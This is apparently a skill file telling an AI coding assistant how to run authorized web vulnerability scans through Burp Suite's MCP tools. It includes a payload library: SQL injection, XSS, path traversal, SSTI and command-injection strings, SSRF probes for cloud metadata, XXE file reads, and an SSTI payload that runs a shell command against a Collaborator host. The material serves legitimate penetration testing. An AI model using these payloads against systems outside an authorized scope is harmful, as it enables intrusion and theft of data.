---
name: burp-scan
description: Burp Suite scanning via MCP tools — passive traffic analysis, active payload testing, OOB verification, and vulnerability reporting using Burp's proxy, HTTP sender, Collaborator, and scanner APIs. Use when the user has Burp Suite running with the AI Agent MCP server and wants to scan, test, or analyze web traffic through an AI coding assistant (Claude Code, Gemini CLI, Codex, etc.).
---

# Burp Scan Skill

Tactical scanning engine for Burp Suite via MCP. Operates Burp's tools programmatically to discover, confirm, and report vulnerabilities.

**Prerequisites**: Burp Suite running with the AI Agent extension loaded and MCP server enabled.

---

## 1. MCP TOOL REFERENCE

Tools organized by scanning action. Tools marked `[unsafe]` require Unsafe Mode enabled. Tools marked `[pro]` require Burp Professional.

### Discover Scope & Attack Surface

| Tool | Purpose |
|---|---|
| `scope_check` | Check if a URL is in scope |
| `site_map` | Browse Burp's site map |
| `site_map_regex` | Search site map by regex |
| `proxy_http_history` | List proxy HTTP history items |
| `proxy_http_history_regex` | Search proxy history by regex |
| `proxy_ws_history` | List WebSocket history |
| `proxy_ws_history_regex` | Search WebSocket history by regex |
| `response_body_search` | Regex search across all response bodies |

### Analyze Traffic

| Tool | Purpose |
|---|---|
| `params_extract` | Extract parameters from a request |
| `find_reflected` | Find reflected parameter values in a response |
| `insertion_points` | List insertion point offsets for a request |
| `request_parse` | Parse raw HTTP request into structured fields |
| `response_parse` | Parse raw HTTP response into structured fields |
| `diff_requests` | Line diff between two requests |

### Send Test Payloads

| Tool | Purpose |
|---|---|
| `http1_request` `[unsafe]` | Send HTTP/1.1 request through Burp and get response |
| `http2_request` `[unsafe]` | Send HTTP/2 request through Burp and get response |
| `repeater_tab` `[unsafe]` | Create a Repeater tab with a request |
| `repeater_tab_with_payload` `[unsafe]` | Create Repeater tab with placeholder replacement |
| `intruder` `[unsafe]` | Send request to Intruder |
| `intruder_prepare` `[unsafe]` | Create Intruder tab with explicit insertion points |

### Out-of-Band (OOB) Verification

| Tool | Purpose |
|---|---|
| `collaborator_generate` | Generate a Burp Collaborator payload (unique subdomain) |
| `collaborator_poll` | Poll for Collaborator interactions (DNS/HTTP callbacks) |

### Encoding & Utility

| Tool | Purpose |
|---|---|
| `url_encode` / `url_decode` | URL encoding/decoding |
| `base64_encode` / `base64_decode` | Base64 encoding/decoding |
| `hash_compute` | Hash text (MD5/SHA1/SHA256/SHA512) |
| `jwt_decode` | Decode JWT header + payload (no signature verification) |
| `decode_as` | Decompress content (gzip/deflate/brotli) |
| `cookie_jar_get` | Read Burp's cookie jar |
| `random_string` | Generate random strings |

### Report Findings

| Tool | Purpose |
|---|---|
| `issue_create` | Create a custom audit issue in Burp's issue list |
| `scanner_issues` `[pro]` | View existing scanner issues |

### Control Burp Scanner

| Tool | Purpose |
|---|---|
| `scan_audit_start` `[pro][unsafe]` | Start a Burp Scanner audit |
| `scan_crawl_start` `[pro][unsafe]` | Start a Burp Scanner crawl |
| `scan_task_status` `[pro]` | Get status of a scan task |

---

## 2. PASSIVE ANALYSIS PROTOCOL

Analyze proxy traffic WITHOUT sending additional requests. This is the first phase of any scan.

### Step 1: Pull Traffic

```
Use proxy_http_history or proxy_http_history_regex to retrieve in-scope traffic.
Filter: exclude static assets (.css, .js, .png, .jpg, .gif, .svg, .ico, .woff, .woff2, .ttf, .eot, .map).
Focus on: HTML, JSON, XML, text responses.
```

### Step 2: Local Pattern Checks (No AI Needed)

Run these deterministic checks on every request/response pair BEFORE any deeper analysis:

**Request Smuggling Indicators**:
- Both `Content-Length` and `Transfer-Encoding: chunked` present
- Multiple `Content-Length` headers with different values
- Severity: Medium, Confidence: 90

**CSRF Absence**:
- State-changing method (POST/PUT/PATCH/DELETE) + cookie-based auth (session/auth/token cookies)
- No CSRF token in parameters or headers, no Origin/Referer header
- No SameSite=Strict/Lax on auth cookies
- Severity: Low, Confidence: 85

**Deserialization Surface**:
- Parameters or body containing Java serialized data markers: `rO0AB` or `aced0005`
- Content-Type: `java-serialized` or `octet-stream` with serialized markers
- Severity: Information, Confidence: 90

**Unrestricted File Upload**:
- Multipart upload with dangerous extension (php, phtml, asp, aspx, jsp, jspx, cgi, py, rb, exe, dll)
- Response 2xx AND response references the uploaded filename
- Severity: Medium, Confidence: 90

### Step 3: Extract Context for Deep Analysis

For each request/response pair, extract:

1. **URL, Method, Status, MIME type**
2. **Request headers** (focus on: Authorization, Cookie, X-API-Key, Content-Type, Origin, Referer, Host, X-Forwarded-For/Host)
3. **Response headers** (focus on: Server, X-Powered-By, Set-Cookie, Access-Control-Allow-Origin, Content-Security-Policy, X-Frame-Options)
4. **Parameters** (name, value, type: URL/BODY/COOKIE/JSON)
5. **Potential Object IDs** in URL path or parameters (numeric IDs, UUIDs, MongoDB ObjectIds)
6. **Auth mechanisms** (session cookies vs Bearer token vs API key)
7. **Tech stack hints** (Server header, X-Powered-By, framework-specific headers)

### Step 4: Analysis Checklist

For each request/response pair, check for:

**Injection**: XSS, SQLi, CMDI, SSTI, SSRF, XXE, NoSQL injection, GraphQL injection
**Auth/Access Control**: IDOR/BOLA, BAC (horizontal/vertical), CSRF, JWT weaknesses
**Information Disclosure**: Secrets in responses, debug endpoints, source code exposure
**Configuration**: CORS misconfiguration, open redirect, missing security headers
**High-Value**: Account takeover paths, cache poisoning, request smuggling, host header injection
**API**: Version bypass, GraphQL introspection enabled

### Step 5: Severity Definitions

| Severity | Examples |
|---|---|
| **Critical** | RCE, authentication bypass, full account takeover |
| **High** | SQLi, stored XSS, SSRF with internal access, deserialization, command injection |
| **Medium** | Reflected XSS, IDOR/BOLA, CSRF on sensitive actions, open redirect, LFI |
| **Low** | Information disclosure, verbose errors, minor misconfigurations |

### DO NOT REPORT

- Missing security headers (CSP, X-Frame-Options, HSTS, X-Content-Type-Options) as standalone findings
- "Potential" issues without concrete evidence in the request/response
- Generic parameter reflection without XSS context (value echoed in non-executable context)
- Absence of rate limiting as a standalone vulnerability

### Step 6: JS Endpoint Discovery

When you encounter JavaScript files in proxy history, extract API endpoints using these patterns:

```
fetch("url"), axios.METHOD("url"), $.ajax({url:"..."}), XMLHttpRequest.open("METHOD","url")
"/api/...", "/v1/...", "/v2/...", endpoint="/...", "/segment/segment/..."
```

Exclude: `/css/`, `/js/`, `/img/`, `/static/`, `/assets/`, `/fonts/`, `/media/`, `/.well-known/`
Exclude extensions: .js, .css, .map, .png, .jpg, .svg, .ico, .woff, .pdf, .zip

Test discovered endpoints for access control issues (unauthenticated access, missing authorization).

---

## 3. ACTIVE TESTING PAYLOAD LIBRARY

Use payloads via `http1_request` to confirm passive findings. Always test against in-scope targets only.

### SQL Injection

**Error-based** (Detection: look for DB-specific error strings):
```
'
"
'--
';--
1'
\
```
Evidence patterns (95% confidence):
- MySQL: `You have an error in your SQL syntax`
- PostgreSQL: `ERROR: syntax error at or near`
- MSSQL: `Unclosed quotation mark after the character string`
- Oracle: `ORA-\d{4}:`
- SQLite: `SQLITE_ERROR` or `near "...": syntax error`

**Blind Boolean** (Detection: compare response differences):
```
1' AND '1'='1    (should return same as original)
1' AND '1'='2    (should return different/empty)
1 AND 1=1        (numeric context - same)
1 AND 1=2        (numeric context - different)
```
Protocol: Send BOTH true and false conditions. If true matches original and false differs -> confirmed.

**Time-based** (Detection: measure response delay >= 5 seconds):
```
1' AND SLEEP(5)--          (MySQL)
1'; WAITFOR DELAY '0:0:5'--  (MSSQL)
1' AND pg_sleep(5)--       (PostgreSQL)
```

**UNION-based** [MODERATE risk]:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### XSS Reflected

Unique marker: `XSS-BURP-AI-1337` (check for this exact string in response)

```
<script>alert('XSS-BURP-AI-1337')</script>
<img src=x onerror=alert('XSS-BURP-AI-1337')>
<svg onload=alert('XSS-BURP-AI-1337')>
'"><script>alert('XSS-BURP-AI-1337')</script>
<body onload=alert('XSS-BURP-AI-1337')>
javascript:alert('XSS-BURP-AI-1337')
<ScRiPt>alert('XSS-BURP-AI-1337')</sCrIpT>
</script><script>alert('XSS-BURP-AI-1337')</script>
```
Confidence: 95% if marker reflected with intact tags. 75% if `alert(1)` reflected (needs manual check).

### LFI / Path Traversal

```
../../../etc/passwd                    (Linux - look for root:x:0:0)
....//....//....//etc/passwd           (filter bypass)
..%2f..%2f..%2fetc/passwd              (URL encoded)
..%252f..%252f..%252fetc/passwd        (double encoded)
/etc/passwd                            (absolute path)
file:///etc/passwd                     (file protocol)
..\..\..\\windows\\win.ini             (Windows - look for [fonts])
../../../etc/passwd%00                 (null byte)
....//....//....//etc/passwd%00.jpg    (extension bypass)
```
Evidence: `root:x:0:0:root:/root:` (95%) or `[fonts]` header (90%)

### SSTI (Server-Side Template Injection)

Unique math markers to avoid false positives:

```
{{1337*73}}          -> look for 97601 in response
{{31337*3}}          -> look for 94011 in response
{{7*'7'}}            -> look for 7777777 (Jinja2 specific)
${1337*73}           -> look for 97601 (Java EL, Spring)
<%= 1337*73 %>       -> look for 97601 (ERB/Ruby)
#{1337*73}           -> look for 97601 (Thymeleaf)
*{1337*73}           -> look for 97601 (Thymeleaf)
{{config}}           -> config dump (Jinja2)
{{request}}          -> request object leak (Jinja2)
{{''.__class__}}     -> Python class access [MODERATE]
```
Evidence: Math result `97601`, `94011`, or `7777777` in response (95% confidence).

### Command Injection

```
; id           -> look for uid=XXX(username) gid=XXX
| id           -> same
|| id          -> same
& id           -> same
&& id          -> same
`id`           -> same (backticks)
$(id)          -> same (command substitution)
| whoami       -> look for username output
; sleep 5      -> 5s delay (blind)
| sleep 5      -> 5s delay (blind)
```
Evidence: `uid=\d+\(\w+\) gid=\d+\(\w+\)` in response (95% confidence).

### SSRF

```
http://127.0.0.1
http://localhost
http://[::1]
http://127.0.0.1:22                          (SSH banner)
http://127.0.0.1:3306                        (MySQL)
http://169.254.169.254/latest/meta-data/     (AWS metadata) [MODERATE]
http://metadata.google.internal/computeMetadata/v1/  (GCP metadata) [MODERATE]
file:///etc/passwd
dict://127.0.0.1:11211/stats                 (Memcached)
gopher://127.0.0.1:6379/_INFO                (Redis)
```

### XXE

```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
```

### IDOR / BOLA (Context-Aware)

No static payloads. Generate based on original value:

**Numeric IDs**: Test `ID-1`, `ID+1`, `1` (first/admin), `0` (edge case), `-1` (negative)
**UUIDs**: Modify last character (`0`->`1` or vice versa)

Protocol: Compare response for original ID vs manipulated ID. If you get valid data for a different user's ID -> IDOR confirmed.

### Host Header Injection

Test marker: `evil-burp-ai-test.com`

```
Host: evil-burp-ai-test.com     -> check if reflected in response body or Location header
Host: localhost                  -> check if reflected
Host: 127.0.0.1                 -> check if reflected
```

### OAuth Misconfiguration

Test markers: `evil-burp-ai.com`

```
redirect_uri=https://evil-burp-ai.com/callback          (arbitrary redirect)
redirect_uri=https://legitimate.com.evil-burp-ai.com     (subdomain bypass)
redirect_uri=https://legitimate.com@evil-burp-ai.com     (@ bypass)
redirect_uri=https://legitimate.com%40evil-burp-ai.com   (encoded @ bypass)
```

### Open Redirect

```
//evil.com
https://evil.com
/\evil.com
////evil.com
https:evil.com
```
Evidence: `evil.com` in `Location` response header.

### Cache Poisoning

Test marker: `evil-burp-ai-cache.com`

```
X-Forwarded-Host: evil-burp-ai-cache.com    -> check if reflected in cached response body
```

### CORS Misconfiguration

Test via `Origin` header:
```
Origin: https://evil.com     -> check ACAO header reflects evil.com (95%)
Origin: null                 -> check ACAO: null (90%)
```

### Git/Backup Exposure

Append to base URL:
```
/.git/HEAD       -> look for "ref: refs/heads/"
/.git/config     -> look for "[core]"
/.git/index      -> look for "DIRC" magic bytes
/.svn/entries    -> look for "dir"
```

### Debug Endpoints

Append to base URL:
```
/actuator        /actuator/env     /actuator/health
/_profiler       /telescope        /__debug__
/phpinfo.php     /elmah.axd        /debug    /trace
```

### Price Manipulation

```
-1              (negative value)
0               (zero)
0.001           (near-zero)
999999999       (overflow)
-999999999      (large negative)
```

### Adaptive Payload Generation

When you know the target's tech stack (from Server/X-Powered-By headers or error patterns), generate technology-specific payloads. For example:
- Django + PostgreSQL -> PostgreSQL-specific SQLi syntax
- PHP + Apache -> PHP-specific LFI paths (`php://filter/...`)
- Node.js + Express -> NoSQL injection with MongoDB operators
- Java + Spring -> Spring EL injection (`${...}`)

Safety rule: NEVER generate destructive payloads containing: DROP, DELETE, TRUNCATE, ALTER, GRANT, REVOKE, SHUTDOWN, rm -, FORMAT, DESTROY.

---

## 4. SCANNING WORKFLOW

### Phase 1: Scope & Reconnaissance

```
1. scope_check on target URL
2. site_map to understand application structure
3. proxy_http_history to review captured traffic
4. Identify tech stack from response headers (Server, X-Powered-By)
5. Identify auth mechanism (cookies vs tokens vs API keys)
```

### Phase 2: Passive Analysis

```
1. For each in-scope request/response:
   a. Run local pattern checks (Section 2, Step 2)
   b. Extract context (Section 2, Step 3)
   c. Analyze against checklist (Section 2, Step 4)
   d. Flag potential vulns with evidence

2. JS endpoint discovery:
   a. Find JS files via proxy_http_history_regex with pattern "\.js$"
   b. Extract API endpoints from JS content
   c. Test discovered endpoints for auth issues
```

### Phase 3: Active Confirmation

For each passive finding, confirm with active testing:

```
1. Select payloads from Section 3 based on vuln class
2. Send original request via http1_request (baseline)
3. Send modified request with payload via http1_request
4. Analyze response:

   ERROR_BASED:    Search for error pattern strings in response body
   REFLECTION:     Search for unique marker (XSS-BURP-AI-1337, etc.) in response
   CONTENT_BASED:  Search for expected file content (root:x:0:0, [fonts], 97601)
   BLIND_BOOLEAN:  Send true+false conditions, compare response body/length
   BLIND_TIME:     Measure response time, confirm >= 5000ms delay
   OUT_OF_BAND:    Use collaborator_generate, inject payload, then collaborator_poll

5. Confidence thresholds:
   - >= 95%: CERTAIN  (report immediately)
   - >= 85%: FIRM     (report with evidence)
   - >= 70%: TENTATIVE (investigate further before reporting)
   - < 70%:  DO NOT REPORT
```

### Phase 4: OOB Testing (for blind vulnerabilities)

```
1. collaborator_generate -> get unique subdomain (e.g., xyz.burpcollaborator.net)
2. Inject Collaborator payload in test:
   - SSRF: http://xyz.burpcollaborator.net
   - XXE:  <!ENTITY xxe SYSTEM "http://xyz.burpcollaborator.net">
   - CMDI: ; nslookup xyz.burpcollaborator.net
   - SSTI: {{config.__class__.__init__.__globals__['os'].popen('nslookup xyz.burpcollaborator.net')}}
3. Wait 5-10 seconds
4. collaborator_poll -> check for DNS/HTTP interactions
5. If interactions found -> vulnerability confirmed
```

### Phase 5: Knowledge Tracking

Track per-host information across the scan to improve payload selection:

```
Tech Stack:     Server header, X-Powered-By, X-ASPNet-Version, X-Generator
Auth Info:      Session cookies (session, auth, token, sid, jwt, remember)
                Bearer tokens (Authorization header)
                API keys (X-API-Key, X-Auth-Token)
Error Patterns: Database errors, stack traces, framework exceptions
Prior Findings: What vuln classes were already found on which endpoints
```

Use tech stack knowledge to prioritize:
- Django detected -> test SSTI with `{{...}}`, SQLi with PostgreSQL syntax
- PHP detected -> test LFI with `php://filter`, deserialize with `O:` prefix
- Java detected -> test SSTI with `${...}`, deserialize with `rO0AB`
- .NET detected -> test path traversal with backslashes, VIEWSTATE tampering

---

## 5. ISSUE CREATION PROTOCOL

When a vulnerability is confirmed (confidence >= 85%), create a Burp audit issue:

### issue_create Parameters

```json
{
  "name": "[Vuln Type] - [Specific Detail]",
  "detail": "Full description with evidence...",
  "baseUrl": "https://target.com/path",
  "severity": "HIGH|MEDIUM|LOW|INFORMATION",
  "confidence": "CERTAIN|FIRM|TENTATIVE",
  "remediation": "Mitigation advice...",
  "httpRequest": "GET /path HTTP/1.1\r\nHost: target.com\r\n...",
  "httpResponseContent": "HTTP/1.1 200 OK\r\n...",
  "targetHostname": "target.com",
  "targetPort": 443,
  "usesHttps": true
}
```

### Severity Mapping

| Severity | Vulnerability Classes |
|---|---|
| **HIGH** | SQLi, CMDI, SSTI, XXE, RFI, Deserialization, Request Smuggling, Account Takeover, MFA Bypass, OAuth Misconfiguration, Git Exposure, Subdomain Takeover, Host Header Injection, Cache Poisoning, LDAP Injection, NoSQL Injection, XPath Injection |
| **MEDIUM** | XSS (Reflected/Stored/DOM), LFI, SSRF, IDOR/BOLA, Path Traversal, BAC (Horizontal/Vertical), BFLA, Mass Assignment, Auth Bypass, Session Fixation, GraphQL Injection, Stack Trace Exposure, Sourcemap Disclosure, Backup Disclosure, Debug Exposure, S3 Misconfiguration, Cache Deception, Price Manipulation, Race Condition TOCTOU, File Upload, Access Control Bypass, Email Header Injection, API Version Bypass |
| **LOW** | Open Redirect, Header/CRLF Injection, JWT Weakness, Race Condition, Business Logic, CORS Misconfiguration, Directory Listing, Debug Endpoint, Version Disclosure, Missing Security Headers, Verbose Error, Insecure Cookie, Sensitive Data in URL, Weak Crypto, Log Injection, CSRF, Rate Limit Bypass, Weak Session Token |

### Confidence Mapping

| Confidence | Criteria |
|---|---|
| **CERTAIN** | >= 95% confidence, clear evidence (error string, file content, math result) |
| **FIRM** | >= 85% confidence, strong evidence (response difference, reflection with context) |
| **TENTATIVE** | >= 70% confidence, circumstantial evidence (needs manual verification) |

### Remediation Reference

| Vuln Class | Remediation |
|---|---|
| SQLi | Use parameterized queries or prepared statements. Never concatenate user input into SQL queries. |
| XSS | Encode all user input before rendering in HTML. Use Content-Security-Policy headers. |
| LFI/Path Traversal | Validate and sanitize file paths. Use allowlists for permitted files. |
| SSTI | Use logic-less templates or sandbox template execution. Never pass user input directly to template engines. |
| CMDI | Avoid system commands with user input. Use strict allowlists and proper escaping. |
| SSRF | Validate and allowlist destination URLs. Block requests to internal networks and cloud metadata endpoints. |
| IDOR/BOLA | Implement proper authorization checks. Don't rely on obscurity of IDs. |
| XXE | Disable external entity processing in XML parsers. Use JSON instead of XML where possible. |
| CORS | Use explicit allowlist for origins. Never reflect arbitrary origins. Avoid wildcard with credentials. |
| Open Redirect | Validate redirect URLs against an allowlist. Use relative URLs where possible. |
| JWT | Use strong algorithms (RS256). Validate all JWT claims. Don't accept 'none' algorithm. |
| CSRF | Implement anti-CSRF tokens. Use SameSite cookies and verify Origin/Referer on state-changing requests. |
| Host Header Injection | Validate Host header against allowlist. Don't use Host header in password reset URLs or cache keys. |
| Cache Poisoning | Don't use unkeyed headers in cached responses. Validate all header inputs. |
| OAuth | Strictly validate redirect_uri against exact match allowlist. Use state parameter with unpredictable values. |
| File Upload | Restrict file types, validate content, store outside web root, enforce random names. |
| Request Smuggling | Normalize or reject conflicting Content-Length/Transfer-Encoding headers. Use a single HTTP parser. |
| Deserialization | Avoid deserializing untrusted data. Use allowlists for permitted classes. |

---

## 6. VULNERABILITY CLASSES REFERENCE

### 62 Classes by OWASP Category

**A01 - Broken Access Control**: IDOR, BOLA, BFLA, BAC_HORIZONTAL, BAC_VERTICAL, MASS_ASSIGNMENT, SSRF, CORS_MISCONFIGURATION, DIRECTORY_LISTING

**A02 - Security Misconfiguration**: DEBUG_ENDPOINT, STACK_TRACE_EXPOSURE, VERSION_DISCLOSURE, MISSING_SECURITY_HEADERS, VERBOSE_ERROR

**A04 - Cryptographic Failures**: INSECURE_COOKIE, SENSITIVE_DATA_URL, WEAK_CRYPTO

**A05 - Injection**: SQLI, XSS_REFLECTED, XSS_STORED, XSS_DOM, CMDI, SSTI, XXE, LDAP_INJECTION, XPATH_INJECTION, NOSQL_INJECTION, GRAPHQL_INJECTION, LOG_INJECTION, LFI, RFI, PATH_TRAVERSAL, HOST_HEADER_INJECTION, EMAIL_HEADER_INJECTION

**A06 - Insecure Design**: BUSINESS_LOGIC, RATE_LIMIT_BYPASS, PRICE_MANIPULATION, RACE_CONDITION_TOCTOU

**A07 - Authentication Failures**: JWT_WEAKNESS, AUTH_BYPASS, SESSION_FIXATION, WEAK_SESSION_TOKEN, ACCOUNT_TAKEOVER, OAUTH_MISCONFIGURATION, MFA_BYPASS

**A08 - Integrity Failures**: DESERIALIZATION, REQUEST_SMUGGLING, CSRF, UNRESTRICTED_FILE_UPLOAD

**Cache Attacks**: CACHE_POISONING, CACHE_DECEPTION

**Information Disclosure**: SOURCEMAP_DISCLOSURE, GIT_EXPOSURE, BACKUP_DISCLOSURE, DEBUG_EXPOSURE

**Cloud/Infrastructure**: S3_MISCONFIGURATION, SUBDOMAIN_TAKEOVER

**API Security**: API_VERSION_BYPASS

**Access Control**: ACCESS_CONTROL_BYPASS

**Other**: OPEN_REDIRECT, HEADER_INJECTION, CRLF_INJECTION, RACE_CONDITION

### Scan Modes

| Mode | Classes Included |
|---|---|
| **BUG_BOUNTY** | High-impact only: SQLi, XSS, SSRF, CMDI, SSTI, XXE, IDOR, BOLA, BAC, BFLA, Auth Bypass, OAuth, MFA Bypass, ATO, Host Header Injection, Cache Poisoning/Deception, Open Redirect, Price Manipulation, Race Condition TOCTOU, Access Control Bypass |
| **PENTEST** | All active-testable classes (excludes passive-only) |
| **FULL** | All 62 vulnerability classes |

### Passive-Only Classes (No Active Payloads)

These are detected through traffic analysis only, not payload injection:
CORS_MISCONFIGURATION, MISSING_SECURITY_HEADERS, VERSION_DISCLOSURE, INSECURE_COOKIE, REQUEST_SMUGGLING, CSRF, UNRESTRICTED_FILE_UPLOAD, DESERIALIZATION, SUBDOMAIN_TAKEOVER, S3_MISCONFIGURATION, SOURCEMAP_DISCLOSURE, GIT_EXPOSURE, BACKUP_DISCLOSURE, DEBUG_EXPOSURE

### Impact Context Multipliers

Findings have higher impact when they affect:
- **Auth endpoints** (`/login`, `/signin`, `/auth`, `/password`, `/reset`, `/oauth`, `/sso`, `/2fa`): +30%
- **Payment flows** (`/checkout`, `/payment`, `/cart`, `/order`, `/purchase`, `/billing`): +40%
- **Admin panels** (`/admin`, `/dashboard`, `/manage`, `/control`, `/settings`, `/internal`): +30%
- **PII data** (email, phone, address, SSN, credit card in response): +20%
- **API endpoints** (`/api/`, `/v1/`, `/v2/`, `/graphql`, JSON response): +10%

---

## FALSE POSITIVE INDICATORS

Do NOT report if these are present:

**SQL Injection false positives**:
- Error is in a comment or documentation text
- Error string matches but is inside a `<code>` or `<pre>` block
- Error is from a WAF/security product, not the actual database

**XSS false positives**:
- Payload reflected inside a JavaScript string but properly escaped
- Payload reflected in HTML attribute but URL-encoded
- Payload in Content-Type that is not text/html (e.g., application/json)
- Response has Content-Type: application/json with no HTML rendering context

**LFI false positives**:
- Response contains "root" but not the full passwd format
- Response is a custom error page mentioning the word "passwd"

**SSTI false positives**:
- The number 97601 appears in legitimate content (e.g., product IDs, timestamps)
- Template syntax is reflected but not evaluated (literal `{{1337*73}}` in response)

---

## DESTRUCTIVE PAYLOAD SAFETY

NEVER use or generate payloads containing these patterns:
```
DROP, DELETE, TRUNCATE, ALTER, GRANT, REVOKE, SHUTDOWN
EXEC xp_, rm -, FORMAT, DESTROY
```

All scanning MUST target in-scope assets only. Always verify scope with `scope_check` before active testing.
